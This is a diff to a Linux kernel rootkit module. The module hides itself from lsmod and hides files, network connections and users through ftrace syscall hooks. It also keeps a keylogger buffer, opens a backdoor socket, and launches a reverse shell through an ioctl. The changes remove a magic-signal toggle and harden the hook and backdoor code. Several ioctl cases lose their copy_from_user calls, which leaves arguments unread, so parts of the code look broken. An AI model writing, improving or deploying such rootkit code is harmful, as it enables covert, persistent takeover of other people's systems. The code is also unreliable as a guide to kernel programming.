@@ -68,10 +68,6 @@ static int keylog_pos = 0;
 static bool keylog_enabled = false;
 static DEFINE_SPINLOCK(keylog_lock);
 
-/* === Kill signal hook === */
-static struct ftrace_hook kill_hook;
-typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
-static orig_kill_t orig_kill;
 
 /* === Rootkit active state (toggled via magic signal) === */
 static bool rk_active = true;
@@ -120,7 +116,7 @@ static void hide_module(void)
         return;
     saved_module_list = THIS_MODULE->list.prev;
     list_del_init(&THIS_MODULE->list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
     module_hidden = true;
     pr_info("rootkit: module hidden from lsmod\n");
 }
@@ -690,28 +686,6 @@ static int new_tcp4_seq_show(struct seq_file *seq, void *v)
     return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
 }
 
-/* ============================================================
- * Feature 4: Magic kill signal — toggle rootkit on/off
- * Sending signal 63 to PID 1 toggles all hiding features.
- * ============================================================ */
-static asmlinkage long new_kill(const struct pt_regs *regs)
-{
-    int sig = (int)regs->si;
-    pid_t pid = (pid_t)regs->di;
-
-    if (sig == RK_MAGIC_SIGNAL && pid == 1) {
-        rk_active = !rk_active;
-        pr_info("rootkit: toggled %s via magic signal\n",
-                rk_active ? "ON" : "OFF");
-        if (rk_active && !module_hidden)
-            hide_module();
-        else if (!rk_active && module_hidden)
-            show_module();
-        return 0; /* swallow the signal */
-    }
-    return orig_kill(regs);
-}
-
 
 /**
  * The `hook_callback` function is a static function that modifies the instruction pointer in the
@@ -787,6 +761,7 @@ static int install_read_hook(kallsyms_lookup_name_t lookup)
     if (ret) {
         pr_err("[-] register_ftrace_function (read): %d\n", ret);
         ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
+        read_hook.ops.func = NULL;
         return ret;
     }
     
@@ -833,61 +808,13 @@ static int install_tcp_hook(kallsyms_lookup_name_t lookup)
     if (ret) {
         pr_err("[-] register_ftrace_function (tcp): %d\n", ret);
         ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
+        tcp_seq_hook.ops.func = NULL;
         return ret;
     }
     
     return 0;
 }
 
-static int install_kill_hook(kallsyms_lookup_name_t lookup)
-{
-    int ret;
-
-    kill_hook.name = "__x64_sys_kill";
-    kill_hook.function = new_kill;
-    kill_hook.original = &orig_kill;
-
-    kill_hook.address = lookup(kill_hook.name);
-    if (!kill_hook.address) {
-        pr_err("[-] Symbol not found: __x64_sys_kill\n");
-        return -ENOENT;
-    }
-
-    pr_info("[+] __x64_sys_kill @ 0x%lx\n", kill_hook.address);
-    orig_kill = (orig_kill_t)kill_hook.address;
-
-    kill_hook.ops.func = hook_callback;
-    kill_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
-
-    ret = ftrace_set_filter_ip(&kill_hook.ops, kill_hook.address, 0, 0);
-    if (ret) {
-        pr_err("[-] ftrace_set_filter_ip (kill): %d\n", ret);
-        return ret;
-    }
-
-    ret = register_ftrace_function(&kill_hook.ops);
-    if (ret) {
-        pr_err("[-] register_ftrace_function (kill): %d\n", ret);
-        ftrace_set_filter_ip(&kill_hook.ops, kill_hook.address, 1, 0);
-        return ret;
-    }
-
-    return 0;
-}
-
-static void uninstall_kill_hook(void)
-{
-    if (kill_hook.ops.func != NULL) {
-        int ret = unregister_ftrace_function(&kill_hook.ops);
-        if (ret)
-            pr_err("rootkit: failed to unregister ftrace function (kill) (%d)\n", ret);
-    }
-    if (kill_hook.address != 0) {
-        int ret = ftrace_set_filter_ip(&kill_hook.ops, kill_hook.address, 1, 0);
-        if (ret)
-            pr_err("rootkit: failed to clear ftrace filter (kill) (%d)\n", ret);
-    }
-}
 
 static int install_unlink_hook(kallsyms_lookup_name_t lookup)
 {
@@ -914,6 +841,7 @@ static int install_unlink_hook(kallsyms_lookup_name_t lookup)
     ret = register_ftrace_function(&unlink_hook.ops);
     if (ret) {
         ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 1, 0);
+        unlink_hook.ops.func = NULL;
         return ret;
     }
     return 0;
@@ -952,6 +880,7 @@ static int install_rename_hook(kallsyms_lookup_name_t lookup)
     ret = register_ftrace_function(&rename_hook.ops);
     if (ret) {
         ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
+        rename_hook.ops.func = NULL;
         return ret;
     }
     return 0;
@@ -990,6 +919,7 @@ static int install_udp_hook(kallsyms_lookup_name_t lookup)
     ret = register_ftrace_function(&udp_seq_hook.ops);
     if (ret) {
         ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 1, 0);
+        udp_seq_hook.ops.func = NULL;
         return ret;
     }
     return 0;
@@ -1073,12 +1003,12 @@ static int install_hook(void)
     {
         pr_err("[-] register_ftrace_function: %d\n", ret);
         ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
+        getdents_hook.ops.func = NULL;
         return ret;
     }
 
     install_read_hook(lookup);
     install_tcp_hook(lookup);
-    install_kill_hook(lookup);
     install_unlink_hook(lookup);
     install_rename_hook(lookup);
     install_udp_hook(lookup);
@@ -1150,7 +1080,10 @@ static int handle_backdoor_connection(void)
     int ret = 0;
     int len = 0;
 
-    ret = kernel_accept(backdoor_sock, &client_sock, 0);
+    ret = kernel_accept(backdoor_sock, &client_sock, O_NONBLOCK);
+
+    if (ret == -EAGAIN)
+        return -EAGAIN;
     if (ret < 0)
         return ret;
 
@@ -1185,8 +1118,8 @@ static int backdoor_thread_fn(void *data)
     int ret = 0;
     while (!kthread_should_stop()) {
         ret = handle_backdoor_connection();
-        if (ret < 0 && ret != -EINTR)
-            msleep(100); 
+        if (ret == -EAGAIN || ret < 0)
+            msleep(100);
     }
     return 0;
 }
@@ -1234,7 +1167,7 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
+    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
     if (ret < 0)
         goto out;
 
@@ -1417,8 +1350,6 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     }
 
     case RK_CMD_HIDE_USER:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         if (args.target == 0) {
             hidden_user[0] = '\0';
             printk(KERN_INFO "rootkit: user unhidden\n");
@@ -1435,9 +1366,6 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     case RK_CMD_PROTECT_FILE: {
         char path[PROTECTED_PATH_MAX] = {0};
         unsigned long flags;
-
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         if (strncpy_from_user(path, (const char __user *)args.target,
                               PROTECTED_PATH_MAX - 1) < 0)
             return -EFAULT;
@@ -1459,9 +1387,6 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         char path[PROTECTED_PATH_MAX] = {0};
         unsigned long flags;
         int i;
-
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         if (strncpy_from_user(path, (const char __user *)args.target,
                               PROTECTED_PATH_MAX - 1) < 0)
             return -EFAULT;
@@ -1483,10 +1408,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
     case RK_CMD_REVERSE_SHELL: {
         char *target_str;
-
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
-
+        struct task_struct *ts = NULL;
         target_str = kzalloc(RK_REVSHELL_MAX, GFP_KERNEL);
         if (!target_str)
             return -ENOMEM;
@@ -1497,7 +1419,12 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
             return -EFAULT;
         }
         printk(KERN_INFO "rootkit: launching reverse shell to %s\n", target_str);
-        kthread_run(reverse_shell_fn, target_str, "rk_revshell");
+        ts = kthread_run(reverse_shell_fn, target_str, "rk_revshell");
+        
+        if (IS_ERR(ts)) {
+            printk(KERN_ERR "rootkit: failed to create reverse shell thread\n");
+            kfree(target_str);
+        }
         break;
     }
 
@@ -1644,7 +1571,6 @@ static void __exit rootkit_exit(void)
 
     uninstall_read_hook();
     uninstall_tcp_hook();
-    uninstall_kill_hook();
     uninstall_unlink_hook();
     uninstall_rename_hook();
     uninstall_udp_hook();
